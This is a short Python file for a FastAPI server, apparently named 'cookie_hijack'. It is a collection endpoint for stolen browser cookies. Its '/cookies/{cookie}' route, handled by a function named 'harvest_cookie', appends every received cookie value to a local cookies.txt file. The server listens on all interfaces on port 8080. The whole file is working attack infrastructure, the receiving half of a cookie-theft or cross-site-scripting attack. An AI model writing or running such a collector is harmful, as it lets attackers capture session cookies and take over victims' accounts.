import uvicorn
from fastapi import FastAPI

app=FastAPI()
cookie_path="./cookies.txt"

@app.get("/")
async def home():
    return {"Like":"Cookie"}

@app.get("/cookies/{cookie}")
async def harvest_cookie(cookie:str):
    with open(cookie_path, "a+") as f:
        f.write(cookie+'\n')
        return {"cookie": cookie}

if __name__=="__main__":
    uvicorn.run('cookie_hijack:app', host="0.0.0.0", port=8080,reload=True)